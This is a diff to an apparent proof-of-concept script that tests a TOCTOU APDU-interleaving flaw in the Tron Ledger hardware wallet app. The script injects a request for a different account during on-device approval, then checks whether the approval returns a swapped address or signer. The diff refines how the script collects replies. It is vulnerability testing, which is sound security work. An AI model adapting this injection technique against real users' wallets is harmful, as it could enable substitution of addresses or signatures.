@@ -47,6 +47,7 @@ import argparse
 import hashlib
 import sys
 import time
+import threading
 
 from ledgerblue.comm import getDongle
 from ledgerblue.ledgerWrapper import unwrapResponseAPDU, wrapCommandAPDU
@@ -69,6 +70,8 @@ P1_SIGN = 0x10
 
 SW_OK = 0x9000
 SW_DENIED = 0x6985
+APPROVAL_REPLY_TIMEOUT = 20.0
+HID_POLL_INTERVAL = 0.05
 
 HID_CHANNEL = 0x0101
 HID_PACKET = 64
@@ -83,16 +86,19 @@ class HidInterleaveChannel:
     pending while another APDU is pushed and its reply collected.
     """
 
-    def __init__(self, dongle):
+    def __init__(self, dongle, debug=False):
         # `getDongle(True)` yields a HIDDongleHIDAPI whose `.device` is the
         # underlying hidapi handle.
         self._hid = getattr(dongle, "device", None)
+        self.debug = debug
         if self._hid is None or not getattr(dongle, "ledger", False):
             raise SystemExit(
                 "This PoC requires a USB HID Ledger device. TCP/BLE proxies "
                 "(LEDGER_PROXY_*, LEDGER_BLE_*) are not supported.")
 
     def send(self, apdu):
+        if self.debug:
+            print("    HID => {}".format(bytes(apdu).hex()))
         wrapped = wrapCommandAPDU(HID_CHANNEL, bytearray(apdu), HID_PACKET)
         offset = 0
         while offset < len(wrapped):
@@ -103,22 +109,45 @@ class HidInterleaveChannel:
             offset += HID_PACKET
 
     def receive(self, timeout=45.0):
-        """Reassemble one response, or None if nothing arrives in `timeout`."""
-        self._hid.set_nonblocking(False)
+        """Reassemble one response, or None if nothing arrives in `timeout`.
+
+        Tolerant of a desynced stream: if reassembly raises (stray channel /
+        sequence) the buffer is reset so the next frame can start a fresh APDU.
+        """
+        self._hid.set_nonblocking(True)
         deadline = time.time() + timeout
         data = b""
         while True:
-            remaining_ms = int(max(1.0, (deadline - time.time()) * 1000))
-            frame = self._hid.read(65, remaining_ms)
+            frame = self._hid.read(65)
             if frame:
                 data += bytes(bytearray(frame))
-                response = unwrapResponseAPDU(HID_CHANNEL, bytearray(data),
-                                              HID_PACKET)
+                if self.debug:
+                    print("    HID <= {}".format(bytes(bytearray(frame)).hex()))
+                try:
+                    response = unwrapResponseAPDU(HID_CHANNEL, bytearray(data),
+                                                  HID_PACKET)
+                except Exception:
+                    data = b""
+                    continue
                 if response is not None:
                     status = (response[-2] << 8) | response[-1]
                     return bytes(response[:-2]), status
+            else:
+                time.sleep(HID_POLL_INTERVAL)
             if time.time() >= deadline:
                 return None
+
+    def drain(self, quiet=2.5, overall=90.0):
+        """Collect every response that arrives, stopping after `quiet` seconds
+        of silence (or once `overall` elapses). Order is preserved."""
+        collected = []
+        end = time.time() + overall
+        while time.time() < end:
+            response = self.receive(timeout=quiet)
+            if response is None:
+                break
+            collected.append(response)
+        return collected
 
 
 ###############################################################################
@@ -165,6 +194,26 @@ def prompt(message):
     input("\n>>> {}\n    Press Enter here once done... ".format(message))
 
 
+def wait_for_approval_reply(channel, state, timeout=APPROVAL_REPLY_TIMEOUT):
+    """Block waiting for the approval reply(s).
+
+    This is called from a background worker so the HID read starts before the
+    user approves on-device. On approval the device may emit MORE than one
+    frame back-to-back (e.g. a queued injected-APDU ack plus the signature),
+    in either order, so keep draining after the first reply instead of
+    grabbing just one -- otherwise the signature can be silently dropped.
+    """
+    try:
+        replies = []
+        first = channel.receive(timeout=timeout)
+        if first is not None:
+            replies.append(first)
+            replies.extend(channel.drain(quiet=3.0))
+        state["replies"] = replies
+    except Exception as exc:
+        state["error"] = exc
+
+
 def query_reference_key(dongle, path):
     """Synchronous, plain get-pubkey (no confirmation) for a reference value."""
     data = dongle.exchange(get_public_key_apdu(path, confirm=False))
@@ -174,6 +223,14 @@ def query_reference_key(dongle, path):
 ###############################################################################
 # Scenarios
 ###############################################################################
+def show_replies(label, replies):
+    if not replies:
+        print("  {}: (none)".format(label))
+    for data, status in replies:
+        print("  {}: SW=0x{:04x}, {} data bytes".format(label, status,
+                                                         len(data)))
+
+
 def run_addr(channel, dongle, path_a, path_b):
     print("== Scenario: address-verification swap ==")
     ref_pk_a, addr_a = query_reference_key(dongle, path_a)
@@ -188,37 +245,51 @@ def run_addr(channel, dongle, path_a, path_b):
 
     print("Injecting GET_PUBLIC_KEY (non-confirm) for account B...")
     channel.send(get_public_key_apdu(path_b, confirm=False))
-    injected = channel.receive(timeout=10.0)
-    if injected is None:
-        print("No reply to the injected APDU (device may have queued it).")
-    else:
-        _, status = injected
-        if status != SW_OK:
-            print("Injected APDU refused with SW=0x{:04x} -> looks SAFE "
-                  "(dispatcher rejected it).".format(status))
-            return
-        inj_pk, inj_addr = parse_get_public_key(injected[0])
-        print("Injected APDU answered 0x9000, address={}".format(inj_addr))
+    # The reply may come now (processed during the review) or only after
+    # approval (queued); drain both phases and classify by content afterwards.
+    pre = channel.drain(quiet=3.0)
+    show_replies("pre-approval reply", pre)
 
+    approval_state = {"replies": [], "error": None}
+    approval_thread = threading.Thread(
+        target=wait_for_approval_reply,
+        args=(channel, approval_state),
+        daemon=True,
+    )
+    approval_thread.start()
     prompt("Now APPROVE the address on the device.")
-    result = channel.receive()
-    if result is None:
-        print("No final response received; inconclusive.")
+    approval_thread.join(timeout=APPROVAL_REPLY_TIMEOUT + 5.0)
+    if approval_thread.is_alive():
+        print("\nInconclusive: no approval response was received.")
         return
-    data, status = result
-    if status != SW_OK:
-        print("Confirmation returned SW=0x{:04x}; inconclusive.".format(status))
+    if approval_state["error"] is not None:
+        raise approval_state["error"]
+
+    post = approval_state["replies"]
+    show_replies("post-approval reply", post)
+
+    replies = pre + post
+    if not replies:
+        print("\nInconclusive: the device sent no response at all.")
+        return
+    if all(status != SW_OK for _, status in replies):
+        sw = replies[-1][1]
+        print("\nSAFE-looking: no success reply (last SW=0x{:04x}); the "
+              "dispatcher likely rejected the interleaved APDU.".format(sw))
         return
 
-    _, returned_addr = parse_get_public_key(data)
+    addresses = [
+        parse_get_public_key(data)[1] for data, status in replies
+        if status == SW_OK
+    ]
     print("\nAddress displayed for approval : {}".format(addr_a))
-    print("Address actually returned      : {}".format(returned_addr))
-    if returned_addr == addr_b and returned_addr != addr_a:
+    print("Addresses returned by device   : {}".format(", ".join(addresses)))
+    if addr_b in addresses and addr_a not in addresses:
         print("\n*** VULNERABLE: confirmed A but received B's address. ***")
-    elif returned_addr == addr_a:
-        print("\nSAFE: returned the address that was reviewed.")
+    elif addr_a in addresses:
+        print("\nSAFE: the reviewed address (A) was returned.")
     else:
-        print("\nInconclusive: unexpected address returned.")
+        print("\nInconclusive: unexpected address(es) returned.")
 
 
 def run_keysub(channel, dongle, path_a, path_b):
@@ -239,24 +310,43 @@ def run_keysub(channel, dongle, path_a, path_b):
     channel.send(
         personal_message_first_apdu(path_b, declared_len=64,
                                     chunk=b"\xaa" * 8))
-    injected = channel.receive(timeout=10.0)
-    if injected is not None and injected[1] != SW_OK:
-        print("Injected APDU refused with SW=0x{:04x} -> looks SAFE.".format(
-            injected[1]))
-        return
-    print("Injected APDU accepted (SW=0x9000); shared path overwritten.")
+    # On hardware the injected 0x9000 and the eventual signature may arrive in
+    # either order, so don't assume: drain before and after approval and pick
+    # out the 65-byte signature by content.
+    pre = channel.drain(quiet=3.0)
+    show_replies("pre-approval reply", pre)
 
+    approval_state = {"replies": [], "error": None}
+    approval_thread = threading.Thread(
+        target=wait_for_approval_reply,
+        args=(channel, approval_state),
+        daemon=True,
+    )
+    approval_thread.start()
     prompt("Now APPROVE the transaction on the device.")
-    result = channel.receive()
-    if result is None:
-        print("No final response received; inconclusive.")
+    approval_thread.join(timeout=APPROVAL_REPLY_TIMEOUT + 5.0)
+    if approval_thread.is_alive():
+        print("\nInconclusive: no approval response was received.")
         return
-    data, status = result
-    if status != SW_OK:
-        print("Signing returned SW=0x{:04x}; inconclusive.".format(status))
+    if approval_state["error"] is not None:
+        raise approval_state["error"]
+
+    post = approval_state["replies"]
+    show_replies("post-approval reply", post)
+
+    replies = pre + post
+    acks = [sw for _, sw in replies if len(_) == 0]
+    if acks and all(sw != SW_OK for sw in acks):
+        print("\nSAFE-looking: the injected APDU was refused "
+              "(SW=0x{:04x}).".format(acks[0]))
+
+    signatures = [data for data, sw in replies if sw == SW_OK and len(data) >= 65]
+    if not signatures:
+        print("\nInconclusive: no signature was returned. Is 'Sign by hash' "
+              "enabled, and did you approve on the device?")
         return
 
-    signer = recover_signer(digest, data)
+    signer = recover_signer(digest, signatures[0])
     signer_pk = signer.to_bytes().hex()
     print("\nExpected signer (reviewed A) : {}".format(ref_pk_a.hex()[2:]))
     print("Substituted signer (B)       : {}".format(ref_pk_b.hex()[2:]))
@@ -280,14 +370,16 @@ def main():
                         help="reviewed account (default 44'/195'/0'/0/0)")
     parser.add_argument("--path-b", default="44'/195'/1'/0/0",
                         help="injected account (default 44'/195'/1'/0/0)")
+    parser.add_argument("--debug", action="store_true",
+                        help="log every raw HID frame sent and received")
     args = parser.parse_args()
 
     print("-= Tron Ledger =- TOCTOU interleave PoC (HARDWARE, interactive)")
     print("Make sure the Tron app is open and the device is unlocked.\n")
 
-    dongle = getDongle(True)
+    dongle = getDongle(args.debug)
     try:
-        channel = HidInterleaveChannel(dongle)
+        channel = HidInterleaveChannel(dongle, debug=args.debug)
         SCENARIOS[args.scenario](channel, dongle, args.path_a, args.path_b)
     finally:
         dongle.close()
